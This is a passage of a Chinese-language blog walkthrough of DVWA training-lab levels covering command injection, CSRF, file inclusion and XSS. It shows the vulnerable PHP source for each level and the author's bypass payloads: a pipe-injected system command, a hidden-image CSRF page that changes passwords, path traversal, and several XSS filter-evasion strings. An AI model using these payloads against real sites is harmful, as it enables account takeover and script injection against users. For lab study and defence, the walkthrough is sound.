&#39;&amp;&amp;&#39; =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>发现只过滤了两个符号。</p><blockquote><pre><code class="php">$substitutions = array(    &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,    &#39;;&#39;  =&gt; &#39;&#39;,);</code></pre></blockquote><p>那么其他&amp;、|、||仍然能够使用。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzksq2nj30nl0c23zd.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegjzscr8lj30n00k9jty.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk004ok9j30nb0hc0uu.jpg"/><h4 id="high-1"><a href="#high-1" class="headerlink" title="high"></a>high</h4><p>先查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Get input    $target = trim($_REQUEST[ &#39;ip&#39; ]);    // Set blacklist    $substitutions = array(        &#39;&amp;&#39;  =&gt; &#39;&#39;,        &#39;;&#39;  =&gt; &#39;&#39;,        &#39;| &#39; =&gt; &#39;&#39;,        &#39;-&#39;  =&gt; &#39;&#39;,        &#39;$&#39;  =&gt; &#39;&#39;,        &#39;(&#39;  =&gt; &#39;&#39;,        &#39;)&#39;  =&gt; &#39;&#39;,        &#39;`&#39;  =&gt; &#39;&#39;,        &#39;||&#39; =&gt; &#39;&#39;,    );    // Remove any of the charactars in the array (blacklist).    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    }    else {        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    }    // Feedback for the end user    $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>仍然是过滤符号，发现<code>&#39;| &#39;</code>多了一个空格。于是我们使用|绕过。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk07w955j30nb0btmy0.jpg"/><h4 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h4><p>查看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        }        else {            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        }        // Feedback for the end user        $html .= &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;    }    else {        // Ops. Let the user name theres a mistake        $html .= &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    }}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>用<code>|net user</code>试一下。发现被要求输入正确的IP。注入失败。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk0weg12j30nf094q3l.jpg"/><p>直接限制了输入的格式，有效的防止了命令注入漏洞。</p><h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF 跨站请求伪造"></a>CSRF 跨站请求伪造</h3><p>跨站请求伪造是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。跟XSS相比，<strong>XSS</strong> 利用的是用户对指定网站的信任，<strong>CSRF</strong> 利用的是网站对用户网页浏览器的信任。</p><p>攻击者构建好对目标网站伪造的请求，并把该请求放入自己的网站中，诱使受害者访问攻击者搭建的网站，如果受害者刚好在目标网站登陆过且目标网站存在该漏洞。那么攻击者伪造的请求就会成功执行。这是我自己的理解。</p><h4 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h4><blockquote><p> 检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p></blockquote><h4 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h4><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1e5p8xj30nt09hwex.jpg"/><p><code>http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=1234&amp;password_conf=1234&amp;Change=Change#</code></p><p>当受害者点击这个链接，他的密码就会被修改。这个攻击链接很明显。真正攻击场景会对链接做一些处理。比如网址缩短。</p><p>攻击者在网站上搭建攻击页面。如下图所示。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk1n1yjqj30l8072mxa.jpg"/><p>该页面源代码为：</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://192.168.1.132/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&lt;h2&gt;file not found.&lt;h2&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在受害者点击后成功修改密码。</p><h4 id="medium-2"><a href="#medium-2" class="headerlink" title="medium"></a>medium</h4><blockquote><p>Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.1.132），希望通过这种机制抵御CSRF攻击。</p></blockquote><p>过滤规则是http包头的Referer参数的值中必须包含受害者主机名（这里是192.168.1.132）</p><p>我们可以将攻击页面命名为192.168.1.132.html（页面被放置在攻击者的服务器里，这里是192.168.1.129）就可以绕过了。</p><p>在攻击端搭建网站，先搭建了一个主页index.html。链接使用的是短链接（有效期7天），就是密码修改链接。</p><pre><code class="html">&lt;!-- /*超链接，点击跳转*/ --&gt;&lt;html&gt;&lt;body&gt;&lt;a href=&quot;192.168.1.132.html&quot; target=&quot;_blank&quot;&gt;11111111&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>有搭建了一个静态页面，192.168.1.132.html</p><pre><code class="html">&lt;html&gt;&lt;head&gt;&lt;title&gt;404&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;http://suo.im/6nTcXO&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&lt;h2&gt;file not found.&lt;h2&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在受害者访问这个页面并点击超链接，密码才会被修改。</p><h4 id="high-2"><a href="#high-2" class="headerlink" title="high"></a>high</h4><blockquote><p>High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p></blockquote><p>搞不出来，不会写代码。就这样吧。什么时候会写代码了再说吧。orz</p><h4 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h4><blockquote><p>Impossible级别的代码利用PDO技术防御SQL注入，至于防护CSRF，则要求用户输入原始密码（简单粗暴），攻击者在不知道原始密码的情况下，无论如何都无法进行CSRF攻击。</p></blockquote><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。</p><h4 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h4><p>打开测试文件包含漏洞。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3dH8H.png" alt="Y3wP2.png"></p><p>发现有三个文件，点开后发现URL发生了变化，由<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=include.php</code>变成了<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=file1.php</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BS3Q.png" alt="Y3BS3Q.png"></p><p>通过./实现不同目录间的访问。</p><blockquote><p>/         根目录<br>./        是当前目录<br>../  返回到上一级目录<br>../../ 返回了两级目录<br>.\ 、..\和./、../意义相同</p></blockquote><p>通过URL可以随意修改要访问的文件。<code>http://192.168.1.132/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\..\wamp\www\dvwa\phpinfo.php</code></p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BAEV.png" alt="Y3BAEV.png"></p><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt;</code></pre><p>从源代码我们可以看到，没有做任何过滤。</p><h4 id="medium-3"><a href="#medium-3" class="headerlink" title="medium"></a>medium</h4><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validation$file = str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );$file = str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );?&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/05/10/Y30I9e.png" alt="Y30I9e.png"></p><p>过滤了<code>http://</code>,<code>https://</code>,<code>../</code>,<code>..\</code>但仍可以使用绝对路径、双写绕过。</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3BeCF.png" alt="Y3BeCF.png"></p><h4 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h4><p>查看源代码</p><pre><code class="\">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p>使用file协议绕过。</p><h4 id="impossible-3"><a href="#impossible-3" class="headerlink" title="impossible"></a>impossible</h4><p>查看源代码</p><pre><code>&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];// Input validationif( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {    // This isn&#39;t the page we want!    echo &quot;ERROR: File not found!&quot;;    exit;}?&gt;</code></pre><p>分析源码可以看到,使用白名单,page只能为include.php”、“file1.php”、“file2.php”、“file3.php”之一，只允许包含include.php、file1.php、file2.php、file3.php，不能包含别的文件，彻底杜绝文件包含漏洞</p><p><img src="https://s1.ax1x.com/2020/05/10/Y3B3E6.png" alt="Y3B3E6.png"></p><h3 id="XSS（跨站脚本攻击）"><a href="#XSS（跨站脚本攻击）" class="headerlink" title="XSS（跨站脚本攻击）"></a>XSS（跨站脚本攻击）</h3><p>跨站脚本攻击(CrossSite Scripting)，为了和层叠样式表(CascadingStyle Sheets,CSS)的缩写进行区分，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><h4 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h4><p>通过脚本语言注入篡改网页，插入恶意脚本，控制用户浏览器的攻击行为。</p><blockquote><p>XSS分为反射型xss、存储型xss和基于DOM的xss。</p></blockquote><p>反射型xss和基于DOM的xss都属于非持久性攻击。存储型xss属于持久性攻击。</p><hr><h4 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h4><h5 id="low-4"><a href="#low-4" class="headerlink" title="low"></a>low</h5><p>先查看一下源代码，发现没有任何过滤。</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><p><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk21a9uyj30n905bglu.jpg"/><h5 id="medium-4"><a href="#medium-4" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>在输入框输入<code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk2q6wc0j30nl0570t0.jpg"/><p><code>&lt;script&gt;</code>被过滤掉了。使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk385v0sj30lh05nt8s.jpg"/><p>除此之外，使用大小写也可以绕过。<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk3nrosxj30n705hjrm.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk45rnczj30ky05qq30.jpg"/><h5 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><p>发现使用了正则表达式进行过滤</p><blockquote><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $_GET[ ‘name’ ] );</p></blockquote><p><code>&lt;script&gt;</code>标签被过滤。但仍然可以使用img、body、iframe等其他标签注入恶意的js代码。</p><p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk4u10jlj30kz05ojrg.jpg"/><p><code>&lt;svg onload=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk56hhptj30ks05mq30.jpg"/><h5 id="impossible-4"><a href="#impossible-4" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>看到有一个<code>htmlspecialchars（）函数</code> 。</p><p>这个函数的功能：把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体。</p><p>无法构造标签进行攻击。</p><h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><h5 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Sanitize name input    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>把代码插入到消息框中。<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5kzhd8j30n706bwes.jpg"/><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk5uzd0wj30it05mt8o.jpg"/><p>成功。</p><h5 id="medium-5"><a href="#medium-5" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>查看源代码，发现message有htmlspecialchars()函数，因此没法使用message进行xss。</p><blockquote><p>$message = htmlspecialchars( $message );</p></blockquote><p>发现name没有做实体化限制。因此在name处进行注入。输入代码，发现输入长度被限制了。通过浏览器控制台进行修改。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6btuzqj30nd069wes.jpg"/><p>仍然是使用<code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code>绕过，或使用大小写。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6ojajnj30ik05mq2w.jpg"/><p>使用大小写绕过。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk6zisnwj30no06iwes.jpg"/><p>成功。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7hiabkj30ik05imx4.jpg"/><h5 id="high-5"><a href="#high-5" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = strip_tags( addslashes( $message ) );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    // Update database    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    //mysql_close();}?&gt;</code></pre><p>查看源代码，和之前一样。</p><blockquote><p>$message = htmlspecialchars( $message );</p><p>$name = preg_replace( ‘/&lt;(.<em>)s(.</em>)c(.<em>)r(.</em>)i(.<em>)p(.</em>)t/i’, ‘’, $name );</p></blockquote><p>从name处使用其他标签进行xss注入。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk7z4gwoj30nc068aac.jpg"/><p>成功注入。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk88swh4j30ie05odfs.jpg"/><h5 id="impossible-5"><a href="#impossible-5" class="headerlink" title="impossible"></a>impossible</h5><p>看一下源代码：</p><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;btnSign&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $message = trim( $_POST[ &#39;mtxMessage&#39; ] );    $name    = trim( $_POST[ &#39;txtName&#39; ] );    // Sanitize message input    $message = stripslashes( $message );    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $message = htmlspecialchars( $message );    // Sanitize name input    $name = stripslashes( $name );    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));    $name = htmlspecialchars( $name );    // Update database    $data = $db-&gt;prepare( &#39;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#39; );    $data-&gt;bindParam( &#39;:message&#39;, $message, PDO::PARAM_STR );    $data-&gt;bindParam( &#39;:name&#39;, $name, PDO::PARAM_STR );    $data-&gt;execute();}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><p>name和message都是用htmlspecialchars函数，把符号转化为了实体。</p><h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><h5 id="low-6"><a href="#low-6" class="headerlink" title="low"></a>low</h5><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8kp9exj30nn095755.jpg"/><p>把English更改为<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk8womrtj30g905nq2y.jpg"/><h5 id="medium-6"><a href="#medium-6" class="headerlink" title="medium"></a>medium</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];    # Do not allow script tags    if (stripos ($default, &quot;&lt;script&quot;) !== false) {        header (&quot;location: ?default=English&quot;);        exit;    }}?&gt;</code></pre><p>这里过滤了&lt;script，如果default值中存在&lt;script，default=English。</p><p><code>&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk979l8hj30np08yt9k.jpg"/><p>页面并没有出现弹窗。</p><blockquote><option value="%3Cimg%20src=1%20onerror=alert(/xss/)%3E"></option><option value="English">English</option></blockquote><p>发现代码被插入到value值中，并没有在option标签中，所以img标签没起到作用。</p><p>首先闭合option，发现xss&gt;被插入到了option值中。于是在闭合select标签。之后再加入注入语句就可以了。成功执行。</p><p><code>xss&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</code></p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9lgdjzj30g705qwej.jpg"/><h5 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h5><p>看一下源代码：</p><pre><code class="php">&lt;?php// Is there any input?if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    # White list the allowable languages    switch ($_GET[&#39;default&#39;]) {        case &quot;French&quot;:        case &quot;English&quot;:        case &quot;German&quot;:        case &quot;Spanish&quot;:            # ok            break;        default:            header (&quot;location: ?default=English&quot;);            exit;    }}?&gt;</code></pre><p>使用<code>#&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，注意#前有空格。</p><img src="http://ww1.sinaimg.cn/large/006y3z9Vly1gegk9v6s4ij30hq05o74c.jpg"/><h5 id="impossible-6"><a href="#impossible-6" class="headerlink" title="impossible"></a>impossible</h5><blockquote><p>Don’t need to do anything, protction handled on the client side</p></blockquote><p>对我们输入的参数不进行URL解码。我们输入的数据经过URL编码，直接赋值到optio标签。直接在客户端处理，所以就不存在xss漏洞了。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> XSS </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLMap注入参数记录</title>
      <link href="/2020/03/03/sqlmap-1/"/>
      <url>/2020/03/03/sqlmap-1/</url>
      
